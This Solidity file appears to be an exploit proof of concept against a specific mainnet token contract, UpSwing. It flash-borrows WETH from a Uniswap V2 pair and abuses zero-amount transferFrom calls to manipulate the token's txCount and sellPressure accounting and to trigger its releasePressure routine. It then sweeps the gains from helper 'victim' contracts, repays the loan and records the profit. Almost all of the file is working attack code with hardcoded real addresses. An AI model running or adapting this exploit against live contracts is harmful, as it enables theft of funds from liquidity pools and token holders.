// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUpSwing is IERC20Like {
    function getUNIV2Address() external view returns (address);
    function myPressure(address account) external view returns (uint256);
    function mySteam(address account) external view returns (uint256);
    function paused() external view returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract VictimActor {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    receive() external payable {}

    function sellPortionToPair(address pair, address ups, uint256 amountIn) public onlyOwner returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == ups) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(ups, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else if (token1 == ups) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(ups, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        } else {
            revert("UPS not in pair");
        }
    }

    function sellAllToPair(address pair, address ups) external onlyOwner returns (uint256 amountOut) {
        return sellPortionToPair(pair, ups, IERC20Like(ups).balanceOf(address(this)));
    }

    function sweep(address token, address to) external onlyOwner returns (uint256 amount) {
        amount = IERC20Like(token).balanceOf(address(this));
        if (amount > 0) {
            _safeTransfer(token, to, amount);
        }
    }

    function sweepETH(address payable to) external onlyOwner returns (uint256 amount) {
        amount = address(this).balance;
        if (amount > 0) {
            (bool ok,) = to.call{value: amount}("");
            require(ok, "eth send failed");
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x35a254223960c18B69C0526c46B013D022E93902;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC_WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    struct Plan {
        uint256 borrowWeth;
        uint256 buyUps;
        uint256 seedTxCountVictim;
        uint256 seedReleaseVictim;
        uint256 keepUps;
        uint256 expectedRepay;
        uint256 expectedWethOut;
        uint256 expectedSteam;
        bool valid;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public pair;
    address public steam;
    address public counterToken;

    address public victimTxCountProbe;
    address public victimReleaseProbe;

    uint256 public allowanceToVerifierPath1;
    uint256 public allowanceToVerifierPath2;

    uint256 public path1ZeroTransferCallsSucceeded;
    uint256 public path1PressureBefore;
    uint256 public path1PressureAfter;
    uint256 public path1SteamBefore;
    uint256 public path1SteamAfter;

    uint256 public path2PressureBefore;
    uint256 public path2PressureAfter;
    uint256 public path2SteamBefore;
    uint256 public path2SteamAfter;

    bool public executed;
    bool public path1Touched;
    bool public path2Touched;

    VictimActor internal victimA;
    VictimActor internal victimB;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) return;
        executed = true;

        IUpSwing ups = IUpSwing(TARGET);
        pair = ups.getUNIV2Address();
        if (pair == address(0) || ups.paused()) {
            return;
        }

        steam = _deriveCreateAddress(TARGET, 1);
        if (steam.code.length == 0) {
            steam = address(0);
        }

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (token0 != TARGET && token1 != TARGET) {
            return;
        }

        counterToken = token0 == TARGET ? token1 : token0;
        if (counterToken != WETH) {
            return;
        }

        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 startSteam = steam == address(0) ? 0 : IERC20Like(steam).balanceOf(address(this));

        Plan memory plan = _selectPlan();
        if (!plan.valid) {
            _updateProfit(startWeth, startSteam);
            return;
        }

        bytes memory data = abi.encode(plan, startWeth, startSteam);
        IUniswapV2Pair lender = IUniswapV2Pair(USDC_WETH_PAIR);
        if (lender.token0() == WETH) {
            lender.swap(plan.borrowWeth, 0, address(this), data);
        } else if (lender.token1() == WETH) {
            lender.swap(0, plan.borrowWeth, address(this), data);
        }

        _updateProfit(startWeth, startSteam);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == USDC_WETH_PAIR, "bad lender");

        (Plan memory plan, uint256 startWeth, uint256 startSteam) = abi.decode(data, (Plan, uint256, uint256));
        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == plan.borrowWeth, "bad amount");

        victimA = new VictimActor();
        victimB = new VictimActor();
        victimTxCountProbe = address(victimA);
        victimReleaseProbe = address(victimB);

        uint256 boughtUps = _buyUpsWithWeth(plan.borrowWeth);
        require(boughtUps >= plan.seedTxCountVictim + plan.seedReleaseVictim + plan.keepUps, "insufficient UPS");

        _safeTransfer(TARGET, address(victimA), plan.seedTxCountVictim);
        _safeTransfer(TARGET, address(victimB), plan.seedReleaseVictim);

        allowanceToVerifierPath1 = IERC20Like(TARGET).allowance(address(victimA), address(this));
        allowanceToVerifierPath2 = IERC20Like(TARGET).allowance(address(victimB), address(this));

        {
            address victim = address(victimA);
            address UNIv2 = pair;

            path1PressureBefore = IUpSwing(TARGET).myPressure(victim);
            path1SteamBefore = IUpSwing(TARGET).mySteam(victim);

            // Path 1 anchor: transferFrom(victim, UNIv2, 0) increments txCount[victim]
            // even though allowance(owner, spender) is zero, so a later sell writes a much smaller sellPressure[victim].
            for (uint256 i = 0; i < 24; ++i) {
                if (_callTransferFrom(TARGET, victim, UNIv2, 0)) {
                    unchecked {
                        ++path1ZeroTransferCallsSucceeded;
                    }
                }
            }

            victimA.sellAllToPair(pair, TARGET);
            path1PressureAfter = IUpSwing(TARGET).myPressure(victim);
            path1SteamAfter = IUpSwing(TARGET).mySteam(victim);

            path1Touched = allowanceToVerifierPath1 == 0
                && path1ZeroTransferCallsSucceeded > 0
                && path1PressureAfter <= path1PressureBefore;
        }

        {
            address victim = address(victimB);

            victimB.sellAllToPair(pair, TARGET);
            path2PressureBefore = IUpSwing(TARGET).myPressure(victim);
            path2SteamBefore = IUpSwing(TARGET).mySteam(victim);

            // Path 2 anchor: transferFrom(victim, victim, 0) reaches releasePressure(victim).
            // releasePressure(victim) either settles immediately or halves sellPressure[victim] when pair liquidity is insufficient.
            if (path2PressureBefore > 0) {
                _callTransferFrom(TARGET, victim, victim, 0);
            }

            path2PressureAfter = IUpSwing(TARGET).myPressure(victim);
            path2SteamAfter = IUpSwing(TARGET).mySteam(victim);

            path2Touched = allowanceToVerifierPath2 == 0
                && path2PressureBefore > 0
                && (path2PressureAfter < path2PressureBefore || path2SteamAfter > path2SteamBefore);
        }

        _sweepVictim(address(victimA));
        _sweepVictim(address(victimB));

        uint256 retainedUps = IERC20Like(TARGET).balanceOf(address(this));
        if (retainedUps > 0) {
            _sellUpsForWeth(retainedUps);
        }

        uint256 repayAmount = _sameTokenFlashRepay(plan.borrowWeth);
        _safeTransfer(WETH, USDC_WETH_PAIR, repayAmount);

        _updateProfit(startWeth, startSteam);
    }

    function _selectPlan() internal view returns (Plan memory best) {
        (uint256 reserveUps, uint256 reserveWeth) = _getTargetReserves();
        uint256 totalSupply = IUpSwing(TARGET).totalSupply();
        if (reserveUps == 0 || reserveWeth == 0 || totalSupply == 0) {
            return best;
        }

        uint256[9] memory borrowBps = [uint256(100), 200, 300, 500, 800, 1000, 1500, 2000, 3000];
        uint256[6] memory keepBps = [uint256(2000), 2500, 3000, 3500, 4000, 5000];

        for (uint256 i = 0; i < borrowBps.length; ++i) {
            uint256 borrowWeth = (reserveWeth * borrowBps[i]) / 10_000;
            if (borrowWeth == 0) continue;

            uint256 boughtUps = _getAmountOut(borrowWeth, reserveWeth, reserveUps);
            if (boughtUps < 10_000) continue;

            uint256 seedTxCountVictim = boughtUps / 1000;
            if (seedTxCountVictim == 0) seedTxCountVictim = 1;

            for (uint256 j = 0; j < keepBps.length; ++j) {
                best = _considerPlan(
                    best,
                    reserveUps,
                    reserveWeth,
                    totalSupply,
                    borrowWeth,
                    boughtUps,
                    seedTxCountVictim,
                    keepBps[j]
                );
            }
        }
    }

    function _considerPlan(
        Plan memory best,
        uint256 reserveUps,
        uint256 reserveWeth,
        uint256 totalSupply,
        uint256 borrowWeth,
        uint256 boughtUps,
        uint256 seedTxCountVictim,
        uint256 keepBps
    ) internal pure returns (Plan memory) {
        uint256 keepUps = (boughtUps * keepBps) / 10_000;
        if (keepUps == 0 || keepUps + seedTxCountVictim >= boughtUps) {
            return best;
        }

        uint256 seedReleaseVictim = boughtUps - keepUps - seedTxCountVictim;
        if (seedReleaseVictim == 0) {
            return best;
        }

        (uint256 wethOut, uint256 steamOut) = _simulatePath(
            reserveUps,
            reserveWeth,
            totalSupply,
            borrowWeth,
            seedTxCountVictim,
            seedReleaseVictim,
            keepUps
        );

        uint256 repay = _sameTokenFlashRepay(borrowWeth);
        if (wethOut < repay || steamOut == 0) {
            return best;
        }

        uint256 netWeth = wethOut - repay;
        uint256 bestNetWeth = best.expectedWethOut > best.expectedRepay ? best.expectedWethOut - best.expectedRepay : 0;
        if (!best.valid || netWeth > bestNetWeth || steamOut > best.expectedSteam) {
            return Plan({
                borrowWeth: borrowWeth,
                buyUps: boughtUps,
                seedTxCountVictim: seedTxCountVictim,
                seedReleaseVictim: seedReleaseVictim,
                keepUps: keepUps,
                expectedRepay: repay,
                expectedWethOut: wethOut,
                expectedSteam: steamOut,
                valid: true
            });
        }

        return best;
    }

    function _simulatePath(
        uint256 reserveUps,
        uint256 reserveWeth,
        uint256 totalSupply,
        uint256 borrowWeth,
        uint256 seedTxCountVictim,
        uint256 seedReleaseVictim,
        uint256 keepUps
    ) internal pure returns (uint256 wethOut, uint256 steamOut) {
        uint256 boughtUps = _getAmountOut(borrowWeth, reserveWeth, reserveUps);
        if (boughtUps < seedTxCountVictim + seedReleaseVictim + keepUps) {
            return (0, 0);
        }

        uint256 reserveInUps = reserveUps - boughtUps;
        uint256 reserveOutWeth = reserveWeth + borrowWeth;

        uint256 wethFromTxCountVictim = _getAmountOut(seedTxCountVictim, reserveInUps, reserveOutWeth);
        reserveInUps += seedTxCountVictim;
        reserveOutWeth -= wethFromTxCountVictim;

        uint256 wethFromReleaseVictim = _getAmountOut(seedReleaseVictim, reserveInUps, reserveOutWeth);
        reserveInUps += seedReleaseVictim;
        reserveOutWeth -= wethFromReleaseVictim;

        uint256 pairRatio = ((reserveInUps * 1e18) / totalSupply) * 2;
        steamOut = (((seedReleaseVictim * 46) / 100) * pairRatio) / 1e18;
        if (steamOut >= reserveInUps) {
            steamOut = 0;
        }
        if (steamOut > 0) {
            reserveInUps -= steamOut;
        }

        uint256 wethFromRetained = _getAmountOut(keepUps, reserveInUps, reserveOutWeth);
        wethOut = wethFromTxCountVictim + wethFromReleaseVictim + wethFromRetained;
    }

    function _buyUpsWithWeth(uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == TARGET && token1 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(WETH, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        } else if (token1 == TARGET && token0 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(WETH, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        }
    }

    function _sellUpsForWeth(uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == TARGET && token1 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(TARGET, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else if (token1 == TARGET && token0 == WETH) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(TARGET, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _sweepVictim(address victim) internal {
        VictimActor actor = VictimActor(payable(victim));
        actor.sweep(WETH, address(this));
        if (steam != address(0)) {
            actor.sweep(steam, address(this));
        }
        actor.sweepETH(payable(address(this)));
    }

    function _updateProfit(uint256 startWeth, uint256 startSteam) internal {
        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 endSteam = steam == address(0) ? 0 : IERC20Like(steam).balanceOf(address(this));

        if (endWeth > startWeth) {
            _profitToken = WETH;
            _profitAmount = endWeth - startWeth;
            return;
        }

        if (endSteam > startSteam) {
            _profitToken = steam;
            _profitAmount = endSteam - startSteam;
            return;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _getTargetReserves() internal view returns (uint256 reserveUps, uint256 reserveWeth) {
        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        if (token0 == TARGET) {
            reserveUps = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveUps = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _sameTokenFlashRepay(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _callTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool ok) {
        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount));
    }

    function _deriveCreateAddress(address deployer, uint256 nonce) internal pure returns (address derived) {
        if (nonce == 0x00) {
            return address(uint160(uint256(keccak256(abi.encodePacked(hex"d694", deployer, hex"80")))));
        }
        if (nonce <= 0x7f) {
            return address(uint160(uint256(keccak256(abi.encodePacked(hex"d694", deployer, bytes1(uint8(nonce)))))));
        }
        if (nonce <= 0xff) {
            return address(uint160(uint256(keccak256(abi.encodePacked(hex"d794", deployer, hex"81", bytes1(uint8(nonce)))))));
        }
        if (nonce <= 0xffff) {
            return address(uint160(uint256(keccak256(abi.encodePacked(hex"d894", deployer, hex"82", bytes2(uint16(nonce)))))));
        }
        if (nonce <= 0xffffff) {
            return address(uint160(uint256(keccak256(abi.encodePacked(hex"d994", deployer, hex"83", bytes3(uint24(nonce)))))));
        }
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"da94", deployer, hex"84", bytes4(uint32(nonce)))))));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}
